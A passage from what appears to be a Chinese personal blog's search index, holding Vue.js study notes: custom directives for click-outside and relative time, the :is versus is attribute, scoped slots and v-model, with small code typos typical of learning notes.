class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#index.html[v-cloak]</span></span><br><span class="line">div#app</span><br><span class="line">    div.main[v-clickoutside.esc=<span class="string">&quot;handleClose&quot;</span>]</span><br><span class="line">    button[@click=<span class="string">&quot;show=!show&quot;</span>]&#123;点击显示下拉菜单&#125;</span><br><span class="line">    div.dropdown[v-show=<span class="string">&quot;show&quot;</span>]</span><br><span class="line">        p&#123;下拉框的内容，点击外面区域可关闭&#125;</span><br><span class="line"></span><br><span class="line">script src=<span class="string">&quot;clcikoutside.js&quot;</span></span><br><span class="line">script  </span><br><span class="line">    var app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">        el:<span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">        data:&#123;show:<span class="keyword">false</span>&#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line">            handleClose:function()&#123;</span><br><span class="line">                <span class="keyword">this</span>.show=<span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//----------------------------------</span></span><br><span class="line"><span class="comment">//clickoutside.js</span></span><br><span class="line">Vue.directive(<span class="string">&#x27;clickoutside&#x27;</span>,&#123;</span><br><span class="line">    bind:function(el,binding,vnode)&#123;</span><br><span class="line">        function documentHandler(e)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!el.contains(e.target) || e.keyup==<span class="number">27</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(binding.expression)&#123;</span><br><span class="line">                    binding.value();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        el.__vueClickOutside__=documentHandler;</span><br><span class="line">        document.addEventListener(<span class="string">&#x27;click&#x27;</span>,documentHandler);</span><br><span class="line">        <span class="keyword">if</span>(binding.modifiers.esc) document.addEventListener(<span class="string">&#x27;keyup&#x27;</span>,documentHandler);</span><br><span class="line">    &#125;;</span><br><span class="line">    unbind:function(el,binding)&#123;</span><br><span class="line">        document.removeEventListener(<span class="string">&#x27;click&#x27;</span>,el__vueClickOutside__);</span><br><span class="line">        <span class="keyword">if</span>(binding.modifiers.esc) document.removeEventListener(<span class="string">&#x27;keyup&#x27;</span>,el.__vueClickOutside__);</span><br><span class="line">        delete el.__vueClickOutside__;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//-------------------------------</span></span><br><span class="line"><span class="comment">//style.css</span></span><br><span class="line">[cloak]&#123;</span><br><span class="line">    display:none;</span><br><span class="line">&#125;</span><br><span class="line">.main&#123;</span><br><span class="line">    <span class="built_in">width</span>:<span class="number">100</span>px</span><br><span class="line">&#125;</span><br><span class="line">button&#123;</span><br><span class="line">    dispaly:block;</span><br><span class="line">    position:relative;</span><br><span class="line">    <span class="built_in">width</span>:<span class="number">100</span>%;</span><br><span class="line">    <span class="built_in">color</span>:#fff;</span><br><span class="line">    <span class="built_in">background</span>-<span class="built_in">color</span>:#<span class="number">39</span>f;</span><br><span class="line">    border:<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">text</span>-align:center;</span><br><span class="line">    font-<span class="built_in">size</span>:<span class="number">12</span>px,</span><br><span class="line">    border-radius:<span class="number">4</span>px;</span><br><span class="line">    outline:none;</span><br><span class="line">    <span class="built_in">cursor</span>:pointer;</span><br><span class="line">&#125;</span><br><span class="line">button:active&#123;</span><br><span class="line">    top:<span class="number">1</span>px;</span><br><span class="line">    left:<span class="number">1</span>px;</span><br><span class="line">    <span class="built_in">color</span>:<span class="built_in">red</span>;</span><br><span class="line">&#125;</span><br><span class="line">.dropdown&#123;</span><br><span class="line">    <span class="built_in">width</span>:<span class="number">100</span>%;</span><br><span class="line">    <span class="built_in">height</span>:<span class="number">110</span>px;</span><br><span class="line">    margin:<span class="number">5</span>px <span class="number">0</span>;</span><br><span class="line">    font-<span class="built_in">size</span>:<span class="number">12</span>px;</span><br><span class="line">    <span class="built_in">background</span>-<span class="built_in">color</span>:#fff;</span><br><span class="line">    border-radius:<span class="number">15</span>px;</span><br><span class="line">    <span class="built_in">box</span>-shadow:<span class="number">0</span> <span class="number">5</span>px <span class="number">16</span>px rgba(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.2</span>);</span><br><span class="line">&#125;</span><br><span class="line">.dropdown p&#123;</span><br><span class="line">    display:inline-block;</span><br><span class="line">    padding:<span class="number">6</span>px</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="实时时间转换"><a href="#实时时间转换" class="headerlink" title="实时时间转换"></a>实时时间转换</h5><p>时间转换的逻辑：</p><ul><li>1分钟以前，显示“刚刚”</li><li>1分钟~1小时之间，显示“xx分钟前”</li><li>1小时~1天之间，显示“xx小时前”(&lt;24小时，但是已经过一天的显示“1天前”)</li><li>1天~1个月(31天)之间，显示“xx天前”</li><li>大于一个月，显示“xx年xx月xx日”</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">//<span class="keyword">index</span>.html</span><br><span class="line">div#app</span><br><span class="line">    v-<span class="type">time</span>=&quot;tmeNow&quot;</span><br><span class="line">    v-<span class="type">time</span>=&quot;tmeBefore&quot;</span><br><span class="line"></span><br><span class="line">script</span><br><span class="line">    app=<span class="built_in">new</span> Vue</span><br><span class="line">        data:&#123;</span><br><span class="line">            timeNow=(<span class="built_in">new</span> <span class="type">Date</span>()).getTime(),</span><br><span class="line">            timeBefore:<span class="keyword">function</span>()&#123;</span><br><span class="line">                var <span class="type">date</span>=<span class="built_in">new</span> <span class="type">Date</span>();</span><br><span class="line">                <span class="type">date</span>.setDate(<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="type">date</span>.getTime();</span><br><span class="line">            &#125;()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">//<span class="comment">------------------------------</span></span><br><span class="line">//<span class="type">time</span>.js</span><br><span class="line">var <span class="type">Time</span>=&#123;</span><br><span class="line">    //获取当前时间戳</span><br><span class="line">    getUnix:<span class="keyword">function</span>()&#123;</span><br><span class="line">        var <span class="type">date</span>=<span class="built_in">new</span> <span class="type">Date</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="type">date</span>.getTime();</span><br><span class="line">    &#125;,</span><br><span class="line">    //获取今天<span class="number">0</span>点<span class="number">0</span>分<span class="number">0</span>秒的时间戳</span><br><span class="line">    getTodayUnix:<span class="keyword">function</span>()&#123;</span><br><span class="line">        var <span class="type">date</span> = <span class="built_in">new</span> <span class="type">Date</span>();</span><br><span class="line">        <span class="type">date</span>.setSeconds(<span class="number">0</span>);</span><br><span class="line">        <span class="type">date</span>.setMinutes(<span class="number">0</span>);</span><br><span class="line">        <span class="type">date</span>.setHours(<span class="number">0</span>);</span><br><span class="line">        <span class="type">date</span>.setMilliseconds(<span class="number">0</span>);</span><br><span class="line">        //console.log(<span class="string">&#x27;今天的时间：&#x27;</span>+<span class="type">date</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="type">date</span>.getTime();</span><br><span class="line">    &#125;,</span><br><span class="line">    //获取今年<span class="number">1</span>月<span class="number">1</span>日<span class="number">0</span>点<span class="number">0</span>分<span class="number">0</span>秒的时间戳</span><br><span class="line">    getYearUnix:<span class="keyword">function</span>()&#123;</span><br><span class="line">        var <span class="type">date</span>=<span class="built_in">new</span> <span class="type">Date</span>();</span><br><span class="line">        <span class="type">date</span>.setMonth(<span class="number">0</span>);</span><br><span class="line">        <span class="type">date</span>.setDate(<span class="number">1</span>);</span><br><span class="line">        <span class="type">date</span>.setSeconds(<span class="number">0</span>);</span><br><span class="line">        <span class="type">date</span>.setMinutes(<span class="number">0</span>);</span><br><span class="line">        <span class="type">date</span>.setHours(<span class="number">0</span>);</span><br><span class="line">        <span class="type">date</span>.setMilliseconds(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="type">date</span>.getTime();</span><br><span class="line">    &#125;,</span><br><span class="line">    //返回 年月日格式</span><br><span class="line">    getLastDate:<span class="keyword">function</span>(<span class="type">time</span>)&#123;</span><br><span class="line">        var <span class="type">date</span>=<span class="built_in">new</span> <span class="type">Date</span>(<span class="type">time</span>);</span><br><span class="line">        var month = <span class="type">date</span>.getMonth()+<span class="number">1</span>&lt;<span class="number">10</span> ? <span class="string">&#x27;0&#x27;</span>+ (<span class="type">date</span>.getMonth()+<span class="number">1</span>) : <span class="type">date</span>.getMonth()+<span class="number">1</span>;</span><br><span class="line">        var day=<span class="type">date</span>.getDay()&lt;<span class="number">10</span> ? <span class="string">&#x27;0&#x27;</span>+<span class="type">date</span>.getDay() : <span class="type">date</span>.getDay();</span><br><span class="line">        <span class="keyword">return</span> <span class="type">date</span>.getFullYear()+<span class="string">&#x27;-&#x27;</span>+month+<span class="string">&#x27;-&#x27;</span>+day;</span><br><span class="line">    &#125;,</span><br><span class="line">    //转换时间</span><br><span class="line">    getFormatTime:<span class="keyword">function</span>(<span class="type">timestamp</span>)&#123;</span><br><span class="line">        var now=this.getUnix();  //当前时间戳</span><br><span class="line">        var today=this.getTodayUnix();  //今天<span class="number">0</span>点时间戳</span><br><span class="line">        var year = this.getYearUnix();  //今年<span class="number">0</span>点时间戳</span><br><span class="line">        var timer = (now-<span class="type">timestamp</span>)/<span class="number">1000</span>;  //转换为秒级时间戳</span><br><span class="line">        var tip=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        //<span class="keyword">if</span>(timer&lt;=<span class="number">0</span>) tip=<span class="string">&#x27;刚刚&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(Math.floor(timer/<span class="number">60</span>)&lt;=<span class="number">0</span> )&#123;  //放一块会有问题吗？ 是为了提高效率？// timer&lt;=<span class="number">60</span>不一样吗</span><br><span class="line">            tip=<span class="string">&#x27;刚刚&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(timer&lt;<span class="number">3600</span>)&#123;</span><br><span class="line">            tip=Math.floor(timer/<span class="number">60</span>)+<span class="string">&#x27;分钟前&#x27;</span>;</span><br><span class="line">            //console.log(<span class="string">&#x27;?分钟&#x27;</span>+tip)</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(timer&gt;=<span class="number">3600</span> &amp;&amp; (<span class="type">timestamp</span>-today&gt;=<span class="number">0</span>))&#123; //timer&gt;=<span class="number">3600</span>  应该可以去掉吧</span><br><span class="line">            //<span class="type">timestamp</span> &gt; today?   <span class="type">timestamp</span>是当前的时间</span><br><span class="line">            //console.log(<span class="string">&#x27;?小时&#x27;</span>);</span><br><span class="line">            tip=Math.floor(timer/<span class="number">3600</span>)+<span class="string">&#x27;小时前&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(timer/<span class="number">86400</span> &lt;=<span class="number">31</span>)&#123;    //<span class="number">24</span>*<span class="number">3600</span></span><br><span class="line">            //console.log(<span class="string">&#x27;天&#x27;</span>);</span><br><span class="line">            tip=Math.ceil(timer/<span class="number">86400</span>)+<span class="string">&#x27;天前&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            //console.log(<span class="string">&#x27;getlastDate&#x27;</span>);</span><br><span class="line">            tip=this.getLastDate(<span class="type">timestamp</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        var date1=<span class="built_in">new</span> <span class="type">Date</span>(now);</span><br><span class="line">        var date2 = <span class="built_in">new</span> <span class="type">Date</span>(today);</span><br><span class="line">        var date3 = <span class="built_in">new</span> <span class="type">Date</span>(<span class="type">timestamp</span>);</span><br><span class="line">        //console.log(<span class="string">&#x27;now:&#x27;</span>+date1);</span><br><span class="line">        //console.log(<span class="string">&#x27;today:&#x27;</span>+date2);</span><br><span class="line">        //console.log(<span class="string">&#x27;timestamp:&#x27;</span>+date3);</span><br><span class="line">        //console.log(<span class="string">&#x27;now-timestamp:&#x27;</span>+(now-<span class="type">timestamp</span>));</span><br><span class="line">        //console.log(<span class="string">&#x27;timestamp-today:&#x27;</span>+(<span class="type">timestamp</span>-today));</span><br><span class="line">        <span class="keyword">return</span> tip;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Vue.directive(<span class="string">&#x27;time&#x27;</span>,&#123;</span><br><span class="line">    bind:<span class="keyword">function</span>(el,binding)&#123;</span><br><span class="line">        //第一次会延迟<span class="number">5</span>秒</span><br><span class="line">        el.innerHTML=<span class="type">Time</span>.getFormatTime(binding.<span class="keyword">value</span>),</span><br><span class="line">        el.__timeout__=setInterval(<span class="keyword">function</span>()&#123;</span><br><span class="line">            el.innerHTML=<span class="type">Time</span>.getFormatTime(binding.<span class="keyword">value</span>);</span><br><span class="line">        &#125;,<span class="number">5000</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    unbind:<span class="keyword">function</span>(el)&#123;</span><br><span class="line">        clearInterval(el.__timeout__);</span><br><span class="line">        <span class="keyword">delete</span> el.__timeout__;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 《Vue.js 实战》笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue2.0中的 ：is和is的区别</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/Vue%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/vue2-0%E4%B8%AD%E7%9A%84-%EF%BC%9Ais%E5%92%8Cis%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/Vue%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/vue2-0%E4%B8%AD%E7%9A%84-%EF%BC%9Ais%E5%92%8Cis%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p><a href="https://juejin.im/post/5bdc4a6be51d45082d4ff48c">转载网址</a><br></p><h4 id="is"><a href="#is" class="headerlink" title=":is"></a>:is</h4><p>通过 <code>&lt;component&gt;</code> 元素加一个特性 <code>is</code> 实现不同组件之间的动态切换。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--组件会在 &#x27;currentTabComponent&#x27; 改变时改变 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">component</span> <span class="attr">v-bind:is</span>=<span class="string">&quot;currentTabComponent&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br></pre></td></tr></table></figure><p>示例中的<code>currentTabComponent</code>可以包括：</p><ul><li>已注册组件的名字</li><li>一个组件的选项对象</li></ul><span id="more"></span><h4 id="is-1"><a href="#is-1" class="headerlink" title="is"></a>is</h4><p>有些元素，诸如<code>&lt;ul&gt;</code>、<code>&lt;ol&gt;</code>、<code>table</code>、<code>select</code>，对于哪些元素可以出现在其内部是有严格限制的。<br><br>这会导出我们使用这些约束条件时遇到一些问题：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;table&gt;</span></span><br><span class="line">    <span class="section">&lt;blog-post-row&gt;</span><span class="section">&lt;/bolg-post-row&gt;</span></span><br><span class="line"><span class="section">&lt;/table&gt;</span></span><br></pre></td></tr></table></figure><p>自定义组件<code>&lt;blog-post-row&gt;</code>会被作为无效的内容提升到外部，并导致渲染结果出错。所以我们可以使用<code>is</code>特性：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span> <span class="attr">is</span>=<span class="string">&quot;blog-post-row&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">row</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p>不过，当我们是从一下来源使用模板的话，这条限制是<strong>不存在</strong>的：</p><ul><li>字符串 (例如：template:’…’)</li><li>单文件组件 (.vue)</li><li><code>&lt;script type=&quot;text/x-template&quot;&gt;</code></li></ul><p><em><strong>实例未写</strong></em></p><p><strong>最后</strong></p><p>举栗子实践分析了一番，总算明白了一些，总结一下：</p><ul><li>相同点：都能实现动态组件的效果</li><li>不同点：<code>:is</code>是数据绑定，绑定的值必须在data中定义，<code>is</code>被赋值的值须是子组件的名称</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Vue常见问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转载3-vue作用域插槽slot-scope详解-差评</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/Vue%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/%E8%BD%AC%E8%BD%BD3-vue%E4%BD%9C%E7%94%A8%E5%9F%9F%E6%8F%92%E6%A7%BDslot-scope%E8%AF%A6%E8%A7%A3-%E5%B7%AE%E8%AF%84/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/Vue%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/%E8%BD%AC%E8%BD%BD3-vue%E4%BD%9C%E7%94%A8%E5%9F%9F%E6%8F%92%E6%A7%BDslot-scope%E8%AF%A6%E8%A7%A3-%E5%B7%AE%E8%AF%84/</url>
      
        <content type="html"><![CDATA[<p>插槽(<code>slot</code>)分为单个插槽、具名插槽和作用域插槽。<br><br>作用域插槽是一种特殊的<code>slot</code>,使用一个可以复用的模板替换一渲染元素。<br><br><b>作用：</b>模板是否显示，以及怎样显示由父组件来决定。<br><br><b>对比：</b>前两种插槽的内容(<em>显示什么</em>)和样式(<em>怎么显示</em>)皆由父组件决定;而作用域插槽的样式由父组件决定，内容却由子组件控制。也就是说，前两种插槽不能绑定数据，作用域插槽是一个带绑定数据的插槽。<br><br></p><p>template元素使用 scope=”props”，可以访问子组件的插槽数据。<br></p><p>插槽的书写方式 在2.6版本前后不同。<br></p><ul><li>2.6版本之前的写法</li></ul><ul><li>2.6版本之后的写法</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Vue常见问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转载2：v-model 详解</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/Vue%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/%E8%BD%AC%E8%BD%BD2%EF%BC%9Av-model-%E8%AF%A6%E8%A7%A3/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/Vue%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/%E8%BD%AC%E8%BD%BD2%EF%BC%9Av-model-%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h4 id="v-model用在input元素上时"><a href="#v-model用在input元素上时" class="headerlink" title="v-model用在input元素上时"></a><code>v-model</code>用在<code>input</code>元素上时</h4><p><code>v-model</code>是语法糖。</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input v-model=<span class="string">&quot;sth&quot;</span>/&gt;</span><br><span class="line">=&gt;  &lt;input <span class="symbol">:va</span>lue=<span class="string">&quot;sth&quot;</span> @input=<span class="string">&quot;sth=$event.target.value&quot;</span> /&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<code>input</code>元素本身有个 <code>oninput</code>事件，<br>每当输入框内容发生变化时，就会触发 <code>oninput</code>，把最新的 <code>value</code> 传给 <code>sth</code>。<br><br>&emsp;&emsp;所以，在添加<code>v-model</code>属性时，默认会把<code>value</code>作为元素的属性，然后把<code>input</code>事件作为实时传递<code>value</code>的触发事件。</p><h4 id="v-model用在组件上时"><a href="#v-model用在组件上时" class="headerlink" title="v-model用在组件上时"></a><code>v-model</code>用在组件上时</h4><p>父组件的<code>price</code>初始值是100，传入子组件后，更改子组件的值能实时更新父组件的<code>price</code><span id="more"></span></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父组件监听 input 事件</span></span><br><span class="line">current-<span class="selector-tag">input</span><span class="selector-attr">[v-model=<span class="string">&quot;price=argrments[0]&quot;</span>]</span></span><br><span class="line">=&gt;  current-<span class="selector-tag">input</span><span class="selector-attr">[:value=value]</span><span class="selector-attr">[@input=<span class="string">&quot;price=$event.target.value&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//子组件 需要触发</span></span><br><span class="line">template:`</span><br><span class="line">    <span class="selector-tag">input</span><span class="selector-attr">[ref=input]</span><span class="selector-attr">[:value=<span class="string">&quot;value&quot;</span>]</span><span class="selector-attr">[@input=<span class="string">&quot;$emit(&#x27;input&#x27;,$event.target.value)&quot;</span>]</span></span><br><span class="line">`,</span><br><span class="line">props:<span class="selector-attr">[<span class="string">&#x27;value&#x27;</span>]</span></span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">    data:price=<span class="number">100</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br></pre></td></tr></table></figure><h4 id="缺点和解决办法"><a href="#缺点和解决办法" class="headerlink" title="缺点和解决办法"></a>缺点和解决办法</h4><p>当我们创建复选框或单选框时，<code>v-model</code>就不好用了。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;checkbox&quot;</span>]</span><span class="selector-attr">[v-model=<span class="string">&quot;sth&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><br>因为<code>v-model</code>提供的是<code>value</code>属性和<code>oninput</code>事件，但在上面例子中我们需要的是<code>chekced</code>属性，并且当你点击这个单选框时不会触发<code>oninput</code>事件，只会触发<code>onchange</code>事件。</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input </span></span><br><span class="line">&lt;input type=<span class="string">&quot;checkbox&quot;</span> :checked=<span class="string">&quot;status&quot;</span> <span class="meta">@change</span>=<span class="string">&quot;status=<span class="subst">$event</span>.target.checked&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//v-model用在组件上,通过model选项定制 prop/event</span></span><br><span class="line">&lt;my-checkbox v-model=<span class="string">&quot;foo&quot;</span>&gt;&lt;/my-checkbox&gt;</span><br><span class="line">=&gt; &lt;my-checkbox :checked=<span class="string">&quot;foo&quot;</span> <span class="meta">@balala</span>=<span class="string">&quot;foo=<span class="subst">$event</span>.target.checked&quot;</span> /&gt;</span><br><span class="line"><span class="comment">//定制model</span></span><br><span class="line">    <span class="comment">//监听和触发的事件为 balala</span></span><br><span class="line">    <span class="comment">//同步的值为  checked</span></span><br><span class="line">Vue.component(<span class="string">&#x27;my-checkbox&#x27;</span>,&#123;</span><br><span class="line">    template:`</span><br><span class="line">        &lt;input</span><br><span class="line">            type=<span class="string">&quot;checkbox&quot;</span></span><br><span class="line">            :checked=<span class="string">&quot;checked&quot;</span></span><br><span class="line">            <span class="meta">@change</span>=<span class="string">&quot;<span class="subst">$emit</span>(&#x27;balala&#x27;,<span class="subst">$event</span>.target.checked)&quot;</span></span><br><span class="line">    `,</span><br><span class="line">    props:[<span class="string">&#x27;status&#x27;</span>],</span><br><span class="line">    model:&#123;</span><br><span class="line">        prop:<span class="string">&#x27;status&#x27;</span>,</span><br><span class="line">        event:<span class="string">&#x27;balala&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="本质不过是语法糖，checkbox-自动？"><a href="#本质不过是语法糖，checkbox-自动？" class="headerlink" title="本质不过是语法糖，checkbox 自动？"></a>本质不过是语法糖，checkbox 自动？</h4><p>v-model 在内部为不同的输入元素使用不同的属性并抛出不同的事件：</p><ul><li>text 和 textarea 元素使用 <code>value</code> 属性和 input 事件；</li><li>checkbox 和 radio 使用 <code>checked</code> 属性和 <code>change</code> 事件；</li><li>select 字段将 <code>value</code> 作为 prop 并将 <code>change</code> 作为事件。</li></ul><p><a href="https://www.jianshu.com/p/98dfa4c6389c">其他：v-bind详解</a></p><p>经验： </p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v-model=initValue</span><br><span class="line"><span class="symbol">:value=currentValue</span> <span class="variable">@input</span>=handleUpdate</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="symbol">:value</span> -&gt; value 子组件的props,在父组件有对应</span><br><span class="line">currentValue -&gt;  输入框 显示的值</span><br><span class="line"><span class="variable">@input</span>  -&gt;  输入框改变时触发事件</span><br><span class="line">    </span><br><span class="line">    </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Vue常见问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux使用：Vim常用命令</title>
      <link href="/categories/Linux/Linux%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/linux%E4%BD%BF%E7%94%A8%EF%BC%9Avim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
